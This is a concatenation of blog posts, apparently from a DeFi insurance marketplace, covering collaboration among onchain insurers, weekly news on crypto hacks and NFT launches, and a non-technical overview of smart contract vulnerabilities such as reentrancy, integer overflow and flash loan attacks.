blockchain space. It decreases risk to insurers by passing a portion of the underwriting burden on to others.</p><p>Reinsurance can also help stabilise losses, such as when a cover protocol has to pay for a large number of claims in a short period of time. This can leave them in a dire financial situation. Reassurance offers insurers the opportunity to benefit from a wide base of underwriting capital.</p><h3 id=\"collaborate-to-better-secure-cross-chain-bridges\">Collaborate to Better Secure Cross-Chain Bridges</h3><p>As the name suggests, a cross-chain bridge connects two blockchains so users can transfer digital assets and information from one chain to the other. Because cryptocurrencies and tokens are typically siloed to their native blockchains, bridges are a necessity in facilitating value exchange. <br></p><p>Because they handle such valuable transactions, it’s easy to see why the risks of security breaches are concentrated around cross-chain bridges. One of the biggest DeFi exploits in history was the result of a cross-bridge attack. The <a href=\"https://cointelegraph.com/news/wormhole-token-bridge-loses-321m-in-largest-hack-so-far-in-2022\">Wormhole bridge hack</a> saw the loss of over ETH 120,000 ($321million at the time). </p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/cross-chain-bridge-attacks.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"617\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/cross-chain-bridge-attacks.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/cross-chain-bridge-attacks.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/cross-chain-bridge-attacks.png 1600w, https://blog.neptunemutual.com/content/images/2022/11/cross-chain-bridge-attacks.png 2000w\" sizes=\"(min-width: 720px) 720px\"><figcaption><em>Recent attacks on cross-chain bridges | Source: </em><a href=\"https://en.0xzx.com/what-are-the-common-vulnerabilities-of-cross-chain-bridges/\"><em>0xzx.com</em></a></figcaption></figure><p>While it is not necessarily their responsibility to address this particular issue, onchain insurers are a key stakeholder in the security of cross-chain bridges. Lending their expertise to the matter can definitely help move the needle towards more viable and lasting solutions. <br></p><p>The blockchain space is characterised by a strong sense of community, and so having the brightest minds in the onchain insurance industry coming together to help make it a better protected place should be a positive outcome.</p><h3 id=\"collaborate-to-increase-onchain-insurance-adoption-rates\"><br>Collaborate to Increase Onchain Insurance Adoption Rates</h3><p>The success of insurance protocols is likely to be driven more by widespread adoption of digital asset cover. To make this happen, it’s important to take a step back and examine what factors influence adoption of new technologies:  we examined this issue in our blog “<a href=\"https://medium.com/neptune-mutual/be-aware-of-the-bear-1b718574acca\">Be Aware of the Bear: </a>Crypto Crash Heightens Awareness of Risks &amp; Hacks, But Is This Enough to Drive Mainstream Adoption of Digital Asset Protection?</p><p>According to a <a href=\"https://www.pwc.com/gx/en/industries/technology/publications/blockchain-report-transform-business-economy.html#:~:text=A%20PwC%20study%20predicts%20that,GDP%20over%20the%20next%20decade.\">PwC report</a>, the top driving factors of blockchain adoption are provenance, improved access to payments, and customer engagement.</p><p>To a certain extent, these elements are also crucial to adopting onchain insurance.</p><p>Provenance in the form of authenticated incident reports and claims validations; streamlined financial transactions through efficient underwriting and payouts; and customer engagement in the form of improved top-to-bottom user experience and careful consideration of UI (user interface) design.</p><p>These goals are generally more attainable when there is positive cooperation between existing insurance protocols.</p><h3 id=\"collaborate-on-creating-a-regulatory-framework\">Collaborate on Creating a Regulatory Framework</h3><p>As the onchain insurance grows in maturity, we can expect regulators to take a more active interest in the space. After all, the real-world insurance industry is one of the most regulated.</p><p>Most countries have wasted no time in drafting up regulatory guidelines for blockchain-related transactions.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/crypto-regulation-worldwide.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"672\" height=\"533\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/crypto-regulation-worldwide.png 600w, https://blog.neptunemutual.com/content/images/2022/11/crypto-regulation-worldwide.png 672w\"><figcaption><em>Crypto regulations around the world | Source: </em><a href=\"https://complyadvantage.com/insights/cryptocurrency-regulations-around-world/\"><em>complyadvantage.com</em></a></figcaption></figure><p>At some point, it may be that regulations are expanded to include aspects of the operating activity of onchain insurance providers. And when that time comes, maintaining a collaborative approach between cover protocols can greatly help in moving these discussions in the right direction.</p><h2 id=\"what-do-industry-leaders-think-about-the-role-of-cooperation-among-cover-protocols\"><br>What Do Industry Leaders Think About The Role of Cooperation Among Cover Protocols?</h2><p>On April 21, 2022, Ethereum security firm Secureum TrustX, in conjunction with DevConnect Amsterdam, hosted a <a href=\"https://www.youtube.com/watch?v=FrwjUFz-Eeo&amp;t=1527s\">deep-dive discussion</a> with some of the leading innovators in onchain insurance.</p><p>The session was chaired by Emiliano Bonassi of <em>Rentable</em> and included guest speakers – Dan Thomson of <em>insurAce</em>, Evert Kors of <em>Sherlock</em>, Hugh Karp of <em>Nexus Mutual</em>, Kiril Ivanov of <em>Bright Union</em>, and Robert Forster of <em>Ease</em>.</p><p>When asked about the possibility of cooperation among cover protocols with regard to reinsurance, Nexus Mutual’s CEO Hugh Karp had this to say,</p><blockquote>“<em>Yeah, I think it'll happen. I think that we will be seeing some reinsurance between different protocols… But I also think that there will be a point where we may actually go outside at some stage to get reinsurance from traditional markets. And, you know, philosophically that's not really where I want to be, but it might actually help us progress forward.</em>”</blockquote><p>(Armor) Ease founder Robert Forster echoed the sentiment by stating</p><blockquote><em>“I think we're gonna purchase some amount of reinsurance in the next week or so. With our system we need to be adequately diverse. We can't have faults having too much capacity in one way or another. So we need a little bit of reinsurance and I agree that eventually something off chain, something more traditional is going to be extremely helpful… Hopefully, there'll be more talks there regarding how we can work together.”</em></blockquote><p>InsurAce’s director of marketing and business development, Dan Thomson also believes cooperation has an important role in moving onchain insurance forward, particularly with regard to regulatory frameworks</p><blockquote><em>“Yeah, we agree working together is a feature we've actually been talking about this week though not necessarily this exact issue, but also about having to deal with regulators globally… A united front is a much better collaborative state to be rather than competitive.”</em></blockquote><p>Lastly, Bright Union’s co-founder and technical lead Kiril Ivanov believes cooperation is a given in blockchain.</p><blockquote><em>“It's a no brainer. With the composability of the blockchain, reinsurance is a given. If you want to launch your insurance product, you will definitely reuse some of the DeFi solutions out there…so collaboration is part of the blockchain nature.”</em></blockquote><h2 id=\"conclusion\">Conclusion</h2><p>Complex evolving risks, more demanding customers, market disruptions, and other inherent issues require that onchain insurers move toward better collaboration. Working together will be crucial to meeting these challenges and developing specific value-add solutions within the ecosystem.</p><p>What the winning model of cooperation will look like remains to be seen, but it’s clear that it will require a combination of well-defined objectives and a strong commitment to achieve them.</p><p>Let us hear from you.

For NFT enthusiasts, the last few years have been a whirlwind, with unprecedented demand for digital ownership spawning a new and exciting asset class right before our eyes. Another component of the web3 world, the metaverse, has the potential to completely transform the way humans live in the distant future. Future Internet iterations may enable persistent online 3D virtual environments that can be accessed via traditional personal computer devices as well as virtual and augmented reality headgear.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Celer Network was another victim of an attack, as hackers set up a DNS cache poisoning attack on cBridge's frontend UI, which sent some users to malicious smart contracts that could drain all approved tokens. The attack, which was aimed at third-party DNS providers and ISPs outside of the project's control, did not affect the Celer protocol or smart contracts. During this incident, the team responded quickly to fix the problem, and only a small number of users were affected, with the loss of funds roughly amounting to 128.4 ETH at the time the event took place. The team later announced that their frontend would be back soon with better monitoring.<br></p><p>Hackers were able to exploit a bug in the NearX Smart Contract of Stader, causing damage of roughly 165K $NEAR tokens. The staked $NEAR on the #NearX dapp is safe with validators, and the exchange rate on the dapp is intact. The team has been working with security experts to investigate this incident thoroughly, and exploring all options to recover user funds.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>Animoca Brands and its subsidiary Lympo, a leading global sports NFT ecosystem, have announced that they are collaborating with Play Magnus Group (PMG), a global leader in the chess sector that provides entertainment and e-learning services through its chess market brands, to develop Anichess. The alliance will introduce chess players to blockchain gaming and vice versa. Play Magnus Group will invite renowned chess players to support and advise on the introduction of chess engines in Anichess to assist novice players and provide enjoyable games for both casual and skilled players. Anichess will use Lympo's $SPORT token as its primary utility token, which will serve as a gateway to the broader Lympo ecosystem, boosting the playing experience and value proposition of the game.</p><p>Gordon Ramsay, the chef and TV star, has just announced that Hell's Kitchen is coming to the metaverse. The celebrated chef announced the Hell's Kitchen Experience in The Sandbox, complete with a Gordon Ramsay avatar. Although no release date has been set, it is safe to say that the chef's fans and Sandbox users alike are eagerly awaiting the arrival of this new experience. In addition, The Sandbox released a video that gives Hell's Kitchen fans a taste of what the game's experience will be like. According to the official Sandbox page, only the best chefs can survive Hell's Kitchen. Typical tasks will include creating outstanding new dishes, winning competitions, collecting recipes, and competing for the opportunity to become Head Chef.</p><p>The Australian Football League's (AFL) first limited edition drop of NFTs sold out in less than 12 hours. The AFL has followed in the footsteps of other international sporting codes that have ventured into the world of Web3 with the release of their Ripper Skipper 2022 NFTs. The AFL Mint program was used to launch Ripper Skipper 2022, letting people who joined the allow-list to purchase one of 3,800 packs reserved for the drop. These NFTs include 78 significant moments and highlights from the 2021 season in both video and audio formats. Each pack contains three different rarity tiers of moments: common, deluxe, and ovation. Limited edition digital content is also available; first-drop participants have a 10% chance of receiving an AFL Mint Genesis Ball.</p><p>Stepn has collaborated with Atlético de Madrid and all-in-one crypto exchange Whalefin to launch a new collection of 1,001 soccer boot NFTs in Stepn's move-to-earn running app. Each of the 1,001 soccer boots in Atlético de Madrid's new collection is classified as common, uncommon, or rare. The 850 common boots are predicated on the club's national and international titles, the 140 uncommon boots are based on the stadiums, and the 11 rare boots are centered on the starting lineup. Every NFT owner is automatically entered into a prize draw for a vacation and hotel accommodation, as well as tickets to an Atlético de Madrid match at Civitas Metropolitano. Holders of uncommon boots will receive an official shirt from the club, while holders of rare boots will receive autographed shirts.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Tidal Finance has deployed MakerDAO's smart contract coverage, and the coverage pool is now accepting deposits.

Just days before, the blockchain-based cooperative had concluded its fundraising period, closing a whopping $150 million from more than 11,000 enthusiastic members.</p><p>In the attack, the hacker was able to exploit a <a href=\"https://ethereum.stackexchange.com/questions/6176/what-is-a-recursive-calling-vulnerability\">reentrancy attack vulnerability</a> in The DAO’s wallet smart contract code to withdraw Ether multiple times before it could update its balance.</p><p>The fallout from this incident was so profound that it ultimately led to the <a href=\"https://ethereum.org/en/history/#dao-fork\">Ethereum network being forked</a> into the Ethereum and Ethereum Classic blockchains.</p><p>That was not the first incident of funds being stolen from a blockchain project due to a smart contract vulnerability, and it certainly wasn't the last. In fact, over the years, the news of smart contract exploitations has become even more prevalent. In 2022 alone, nearly $2 billion has been stolen in various crypto hacks, exploits, and smart contract vulnerabilities.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/defi-hack-q1-2022.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"911\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/defi-hack-q1-2022.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/defi-hack-q1-2022.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/defi-hack-q1-2022.png 1600w\" sizes=\"(min-width: 720px) 720px\"><figcaption><em>Chart showing crypto hacks and amounts lost in the first half of 2022 | Source: </em><a href=\"https://blockworks.co/the-nine-largest-crypto-hacks-in-2022/\"><em>blockworks.co</em></a></figcaption></figure><p>Unfortunately, with news of each hack, user confidence in DeFi and Web3 projects becomes increasingly eroded, effectively slowing their adoption.</p><p>But why has this remained a largely unsolved issue? More importantly, what can these blockchain projects do to protect themselves and their community members? Here’s what you need to know.</p><h2 id=\"understanding-smart-contracts-and-their-vulnerabilities\">Understanding Smart Contracts and Their Vulnerabilities</h2><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/underestanding-smart-contract-vulnerabilities.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"800\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/underestanding-smart-contract-vulnerabilities.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/underestanding-smart-contract-vulnerabilities.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/underestanding-smart-contract-vulnerabilities.png 1600w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Smart contracts are applications that are deployed on the Ethereum network. The smart contract code cannot be changed after it has been deployed. They are immutable and come with a tamper-proof guarantee.</p><p>This brings up a plethora of new opportunities for effective transactional engagement in a low-trust environment. Especially when engaging with strangers publicly through blockchain or distributed ledger technology</p><p>For example, with a public ledger, you may check and trust smart contract(s) code to perform transactions with total strangers that would not have been feasible or practical in traditional finance:</p><ul><li>Transferring payments based on delivery of goods and services</li><li>Assigning a trusted third party to act a mediator to resolve conflicts if required</li><li>Depositing tokens to allow borrowers to take them out as a loan</li><li>Depositing tokens to borrow stablecoins</li><li>Purchasing an insurance policy to mitigate risks from hacks and exploits</li><li>Participating in a decision-making process of a project or protocol</li><li>Tokenizing traditional stock, assets, and commodities</li><li>Tokenizing art, music, and collectibles</li><li>Tokenizing real-world assets such as fiat currencies, precious metals, and minerals</li><li>Providing discovery services to other smart contracts about events occurring in the real world</li><li>Getting access to unlimited, or very large amounts, of loan capital without having to provide any collateral</li></ul><p>This revolutionary functionality has led to the development of decentralized applications (dApps), which make up most of the projects in the blockchain ecosystem.</p><p>Now when talking about vulnerabilities, it’s important to note that blockchains themselves are inherently secure. In the case of decentralized blockchains, it is extremely difficult to take over the network and tamper with the data stored in the blocks. Hackers know this and that is why they are generally more focused on smart contract vulnerabilities than trying to change the data stored in the blockchain itself.</p><h2 id=\"what-makes-smart-contracts-vulnerable-to-cyberattacks\">What Makes Smart Contracts Vulnerable to Cyberattacks?</h2><p>Smart contracts have several primary attributes – transparent, autonomous, distributed, immutable, and trustless. Ironically, these attributes are also what make smart contracts such a high-interest target among hackers.</p><p>Because they can hold so much value at any given time, smart contracts with vulnerabilities are like low-hanging fruits just waiting to be plucked. In recent times, hackers have been concentrating their efforts on cross-chain bridges – protocols that allow users to swap tokens from other blockchains. <a href=\"https://blockworks.co/cross-chain-bridge-thefts-top-1b-in-2022/\">Over $1 billion</a> has been lost to hackers in these cross-bridge attacks in 2022 alone.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/total-funds-lost-crypto-hacks.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"645\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/total-funds-lost-crypto-hacks.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/total-funds-lost-crypto-hacks.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/total-funds-lost-crypto-hacks.png 1600w\" sizes=\"(min-width: 720px) 720px\"><figcaption><em>Chart showing total funds lost due to crypto hacks, scams, exploits and rug pulls over the last year | Source: </em><a href=\"https://defiyield.app/rekt-database\"><em>defiyield.app/rekt-database</em></a></figcaption></figure><p>A conventional contract, unlike smart contracts, may be enforced via the judicial system. Even if parties disagree on the text of a contract, a decision may still be acquired via legal actions and court judgements. Sometimes one party may seek to take advantage of another by introducing unenforceable terms in a contract, which a court can remedy. Meaning, depending on the legal procedures and documented evidence, what is mentioned in conventional contracts may not necessarily be enforceable, or it may be enforced differently depending on the legal jurisdiction under which the contract is governed.</p><p>This is not exactly the case with smart contracts since the terms that are programmed into the contract will determine precisely how the contract is executed.  Furthermore, there is no possibility of misunderstanding or fabrication of facts or evidence since these things do not exist in the context of smart contracts.  If a smart contract has a defect or a mistake, the mistake, too, is executed without any prejudice or recourse.</p><h3 id=\"upgradability\">Upgradability</h3><p>Although smart contracts are immutable, there are a variety of strategies for achieving \"upgradability.\" It works by deploying a new smart contract and pointing dependents to the newly-deployed contract. A popular DeFi protocol often consists of a variety of smart contracts, the majority of which are capable of being upgraded.</p><p>The upgradability feature exposes this kind of decentralized protocol to a variety of flaws that hackers may exploit. If a hacker is able to attack one of the protocol contracts, they may be able to partially or completely change the protocol code to suit their needs. And as long as there is profit to be made, cybercriminals will continue to find new ways to exploit vulnerabilities in smart contracts.</p><h3 id=\"bugs\">Bugs</h3><p>Even without deliberate attacks, bugs present in smart contract codes are a vulnerability just waiting to be exploited. And since most of these protocols are open source, it makes it more accessible for an attacker to examine the source code for possible vulnerabilities. It's only a matter of time before someone finds something in the code that they can use to work their way into the system.</p><h3 id=\"code-garbage-in-garbage-out\">Code: Garbage In, Garbage Out</h3><p>One of the primary causes for hacking is poorly written smart contract code. Smart contract audits often last for a brief period of time, and the audit teams may not even fully comprehend the source code in the first place. Although it is necessary to go through numerous rounds of smart contract audits, it provides no security guarantees at all.</p><h3 id=\"incompetent-teams-with-millions-of-investor-and-community-dollars\">Incompetent Teams with Millions of Investor and Community Dollars</h3><p>Another attack vector for hackers is to exploit team incompetence, or gross gross negligence, in management of private keys. You've probably heard about private key breaches or hacks. But how can a private key be \"hacked\" in the first place?</p><p>If you're talking about programmatically signing transactions using a private key, it is good security practice to save private keys, access keys, passwords, and so on in a <a href=\"https://cloud.google.com/secret-manager\">secrets manager</a> rather than environment variables. Even when a secrets manager is utilized, a poorly-written application will cheerfully expose all application secrets. There have been multi-million dollar attacks that might have easily been averted by merely practicing \"basic cybersecurity hygiene\".</p><p><strong>Our security team at Neptune Mutual can assist you with full-stack security, including smart contracts reviews, frontend and backend security, DNS security, and so on. Contact us on social media if you are serious about cybersecurity and have the budget, desire, and feeling of responsibility to do so.</strong></p><p>It is much more critical to create smart contracts with RBAC (role-based access control) and to follow the \"principle of least privilege\" when it comes to access. When you know your signer key will be used in an unsecured \"hosted\" environment, make sure the wallet has very restricted access to your application.</p><h2 id=\"leveraging-defi-insurance-cover-policies-to-protect-against-smart-contract-risks\">Leveraging DeFi Insurance Cover Policies to Protect Against Smart Contract Risks</h2><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-defi-insurance-shield.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"800\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/neptune-mutual-defi-insurance-shield.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/neptune-mutual-defi-insurance-shield.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-defi-insurance-shield.png 1600w\" sizes=\"(min-width: 720px) 720px\"></figure><p>As the popularity of DeFi, Web3, NFTs, and other blockchain projects increases, so does the need for cover against theft of digital assets by hackers. Global crypto adoption has been <a href=\"https://blog.chainalysis.com/reports/2021-global-crypto-adoption-index/\">growing exponentially in recent years</a>, but many would-be users and investors have been put off by the risk of losses, and the lack of viable safety and mitigation measures to protect against it.</p><p>In traditional financial markets, insurance has been a “must have” resource for protecting against all manner of different types of risks. There’s no reason why it cannot be used to mitigate security risks within the blockchain industry.</p><p>The rate at which smart contract hacks are growing strongly underlines the need for an effective solution to mitigate these risks. This is why users need decentralized insurance specifically for smart contract risks – a safety net for when something goes wrong.</p><h2 id=\"what-smart-contract-risks-can-decentralized-insurance-cover\">What Smart Contract Risks Can Decentralized Insurance Cover?</h2><p>Before we dive in, you should know that this is by no means an exhaustive list, and does not necessarily represent the smart contract risks that are covered in the <a href=\"https://neptunemutual.com/\">Neptune Mutual marketplace</a>.</p><p>The risks highlighted here are recognized as industry standards in the <a href=\"https://swcregistry.io/\">Smart Contract Weakness (SWC) registry</a>, a depository for identified vulnerabilities in smart contracts.</p><h3 id=\"miner-manipulation-vulnerabilities\">Miner Manipulation Vulnerabilities</h3><p>This refers to a broad classification of smart contract vulnerabilities in which a miner with malicious intent attempts to manipulate variables existing outside of how the smart contracts were programmed. The end goal is to work the system in their favor.</p><p>A common example is the Timestamp dependence vulnerability in which the timestamp of a transaction is influenced by the miner by exploiting the accepted drift or variance between when new blocks are added to a blockchain. While the variance is not in itself a cause for concern, the opening may provide an opportunity for a hacker to alter the timestamp of the block to suit their own nefarious purpose.</p><h3 id=\"arithmetic-error-of-integers\">Arithmetic Error of Integers</h3><p>This is also known as Integer overflow and underflow error. An overflow occurs when a defined output exceeds the maximum size that was allotted to it at the time the code was executed. Conversely, an integer underflow occurs when the output is lower than the minimum allotted size.</p><p>The simplest way to understand this is to picture a car's odometer. The maximum size allotted is usually 6 digits – 999999. But what happens when the odometer clocks 7 digits (1,000,000)? It will be unable to display this output accurately or properly.</p><p>Failing to account for integer overflows and underflows can lead to smart contracts with inaccurate data and unintended outputs, which can pave the way for malicious activities.</p><h3 id=\"reentrancy-attacks\">Reentrancy Attacks</h3><p>This is one of the most destructive smart contract exploits. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function thereby creating a loophole that allows hackers to overtake the system and continuously exploit the function to drain funds from the smart contract. <br></p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/ethereum-dao-hack.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"1116\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/ethereum-dao-hack.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/ethereum-dao-hack.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/ethereum-dao-hack.png 1600w, https://blog.neptunemutual.com/content/images/size/w2400/2022/11/ethereum-dao-hack.png 2400w\" sizes=\"(min-width: 720px) 720px\"></figure><p>In addition to the infamous The DAO hack, reentrancy attacks have been used to exploit the following protocols:</p><ul><li><a href=\"https://peckshield.medium.com/uniswap-lendf-me-hacks-root-cause-and-loss-analysis-50f3263dcc09#:~:text=Specifically%2C%20in%20the%20Uniswap%20hack,that%20she%20can%20borrow%20(and\">Uniswap/Lendf.Me hack</a> in April 2020</li><li><a href=\"https://halborn.com/explained-the-burgerswap-hack-may-2021/\">The BurgerSwap hack</a> in May 2021</li><li><a href=\"https://beosin.medium.com/a-sweet-blow-fb0a5e08657d\">The SURGEBNB hack </a>in August 2021</li><li><a href=\"https://medium.com/siren-markets/siren-incident-report-264e57f16d7\">Siren protocol hack</a> in September 2021</li></ul><h3 id=\"logic-bugs\">Logic Bugs</h3><p>This refers to basic errors in the logic of the smart contract. These can result from simple typographical errors or misunderstandings regarding business assumptions. Regardless of how they are caused, logic bugs can have a serious impact on the security of a network and its applications.</p><h3 id=\"unhandled-exceptions\">Unhandled Exceptions</h3><p>In Solidity, an exception can arise in a variety of situations, but the way these exceptions are handled is not always consistent. Interaction between contracts is the basic foundation of exception handling. As a result, contracts are vulnerable to malicious user attacks, and transactions will be rolled back if these exceptions are not handled properly.</p><h3 id=\"incorrect-erc-20-standard-implementation\">Incorrect ERC-20 Standard Implementation</h3><p>The ERC-20 token has an availability of the well-known OpenZeppelin standard implementation. In most cases, it is fully applicable, and its functionality is sufficient for proper financial operations. Nonetheless, there's a place for custom token standard implementations.</p><p>As a result, it creates a space for inconsistencies between the newly created token and the actual ERC20 standard. However, such a minor change may result in the contract's method becoming non-functional because it will be unable to recognize the interface. It's a minor error that goes unnoticed during testing, but it causes stuck funds and blocked contracts in production.</p><h3 id=\"flash-loan-attacks\">Flash Loan Attacks</h3><p>Flash loans are a type of unsecured loan in DeFi. No collateral is required to access huge amounts of cryptocurrencies and tokens, but the amount borrowed must be returned in a single transaction and within the same block on the blockchain. If the loan is not returned within the stipulated period, the entire transaction is annulled. Crypto traders typically use flash loans to leverage arbitrage (price differences) opportunities. The principle is simple, practical, and automated by smart contracts.</p><p>In a flash loan attack, the perpetrator takes out a flash loan and exploits vulnerabilities in the smart contract to manipulate the price of a crypto asset in their favor, usually by creating an artificial sell-off to profit immensely from the resulting price movements. From 2020 to 2022, <a href=\"https://cryptosec.info/defi-hacks/\">over $300 million</a> has been lost due to flash loan attacks across various DeFi platforms and applications.</p><h2 id=\"how-does-decentralized-insurance-work-on-neptune-mutual\">How Does Decentralized Insurance Work on Neptune Mutual?</h2><p>For the avoidance of confusion, you should note that Neptune Mutual is not an insurance provider. Rather, it is a marketplace for onchain parametric solutions  to protect against smart contract risks in the DeFi, CeFi, NFT, and Web3 spaces.</p><p>Here, blockchain projects can create cover policies against smart contract risks. Users and community members can purchase these policies to safeguard their digital assets over a defined period.</p><p>The underwriting capital for cover policies provided in part by the project creators and by liquidity providers who earn income from the cover fee premiums paid by policy purchasers and staking rewards.</p><p>Because it is a parametric cover, claims payouts are triggered by predefined parameters. Once the occurrence of these parameters has been verified by incident reporters (NPM tokenholders), payouts are disbursed to policyholders without needing to prove individual loss. This makes the entire claims process much simpler and more efficient.</p><p>Learn more about <a href=\"https://blog.neptunemutual.com/what-is-defi-insurance/\">DeFi insurance on Neptune Mutual</a>.</p><h2 id=\"the-bottom-line\">The Bottom Line</h2><p>Even with comprehensive audits and other security measures, smart contracts are still vulnerable to various risks.

        html: "<h2 id=\"tldr\">TL;DR <br></h2><ul><li>Curve Finance front end UI compromised following a DNS attack.</li><li>AUSD, a stablecoin based on Polkadot, was exploited by hackers who minted over 1.2 billion tokens.</li><li>Lamborghini is set to launch newer set of digital collectibles.</li><li>Paris Hilton is building a virtual Malibu Mansion in The Sandbox.<br></li></ul><p>NFTs have already entered the financial, entertainment, healthcare, global supply chain, and insurance industries, demonstrating their disruptive potential in these field. Originally developed as a means to tokenize and transact in fine art and collectibles, this new asset class emerged at the forefront of blockchain technology. The NFT industry is worth over $40 billion, and consumers all around the world are willing to spend millions to add one to their collection.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>There appears to be no letup in the frequency of attacks on blockchain companies. In a recent DNS hijacking attack, hackers stole stablecoins from Curve Finance customers, demonstrating their growing competence in the sector. According to multiple sources, the hacker compromised Curve Finance's name-server and redirected users to his own website, where a malicious link was planted to steal their stablecoins. The perpetrator laundered $570,000 in stolen ETH by sending it to the FixedFloat cryptocurrency exchange. Eventually, the exchange froze 112 ETH, totaling about $191,088.<br></p><p>Hackers infiltrated into the decentralized financial hub of Polkadot, Acala Network, and issued 1.2 billion aUSD tokens, making it the most recent Defi network to experience an exploit. Following the hack, the dollar-pegged stablecoin lost its peg immediately, losing 99% of its value. The coins were purportedly created without any collateral because the hacker exploited a flaw in the iBTC/aUSD liquidity pool. In response, the Acala team put the network in maintenance mode and froze the erroneously minted tokens, that led to the crashing of the USD-pegged stablecoin to a cent.<br></p><p>Hackers targeted the EGD Finance on Binance Smart Chain, eventually cause an unexpected withdrawal of funds from its pool. According to reports, this incident occurred because the price-feeding mechanism for calculating rewards when EGD Finance's contracts received rewards was too simple, resulting in the token price being manipulated for profit by flash loans. The price of the $EGD token fell by 20% of its original value during the heist, which netted the malicious actor approximately 36,000 $BUSD.<br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>After the success of its first two NFT initiatives, Lamborghini is now releasing a third, in collaboration with NFT Pro and INVNT.ATOM in the form of a thrilling airdrop. The manufacturer has launched a virtual tour that begins on the moon, travels through space, and then visits famous landmarks across the earth. Lamborghini's newest NFT lineup advertises itself as an epic road trip through space for NFT collectors. NFTs represent the cars, and can be accumulated by users on a monthly basis until March 2023. The digital collectible consists of four NFTs released each month for 4 days consecutively, each with 24 hours availability period only. The fourth NFT will be available in a limited edition of just 63 units, and at the very end of the campaign, only those who have acquired all the monthly NFTs issued, either the three regular NFTs or three regular plus the limited edition, will receive a special NFT.</p><p>The Sandbox has collaborated with Paris Hilton's 11:11 Media to create a replication of her Malibu mansion in the Metaverse. This action provides her community and fan base with a brand new channel of communication with the star. For example, the Hilton will organize community and social events, such as rooftop parties and glamorous social experiences, in the virtual mansion. In addition, she is organizing a one-of-a-kind Halloween party at her LAND. Even though neither Paris Hilton nor The Sandbox have revealed any specifics regarding the mansion, 11 new avatars based on Paris Hilton's numerous personas will be available on the platform very soon.</p><p>Samsung Electronics has signed a Memorandum of Understanding with partners, including Theta Labs, to operate an NFT ecosystem for its new Galaxy mobile phones. According to the company, the NFT ecosystem will promote consumer experience innovation by connecting the virtual world with real-world benefits. Samsung plans to use NFTs to provide practical benefits such as customer discounts and an authentication tool. The detailed information about the benefits of the digital collectible were revealed during the launch of Galaxy Fold 4, on August 10.</p><p>Dapper Labs has announced a partnership with the Los Angeles Rams, the most recent Super Bowl champions. The company, which created NBA Topshot and NFL All Day, will enter into a lucrative contract with the NFL franchise, fulfilling their NFT needs for the entire season. On the NFL All Day Platform, the initial NFTs will be a brand new set of Super Bowl LVI commemorative rings. Users will be able to purchase 6,050 rings in three tiers of rarity for this initial drop. This included 5k starter rings for $9, 1k all-star rings for $59, and a limited quantity of 50 hall of fame rings for $699. All of the NFTs have now sold out, but the partnership will continue for the remainder of the 2022/23 NFT season.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Bumper Finance has completed their Falkor Alpha test stage, which lasted 14 days!

While cryptocurrency exchanges were once the primary target, hackers appear to have found a new target in blockchain bridges.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Cross-chain bridges continue to be a vulnerability in DeFi and an attractive target for exploiters. Nomad Bridge, the cross-chain interoperability protocol was targeted by hackers, who drained $190 million in liquidity over two and a half hours of attack. Following a regular upgrade in June, the bridge's Replica contract was initialized with a fatal security issue that led to the event. In this instance, the trusted root was set to the 0x00 address, and the old root was invalidated when the trusted root was changed, meaning that all messages were read as valid by default. After a failed initial attempt, the original attacker’s exploit transaction, which was copied by subsequent attackers, was able to call the process function directly, without first assessing its validity. As soon as the fatal blow was struck, the news spread and numerous individuals began to fight over the leftovers. In fact, a shrewder exploiter could have devised a plan to drain the entire bridge for themselves.<br><br>Cryptocurrency exchange ZB Exchange was another victim of a hack that appears to have drained approximately $5 million worth of tokens from the company's hot wallet. According to many sources, hackers may be responsible for transferring 21 different types of tokens off 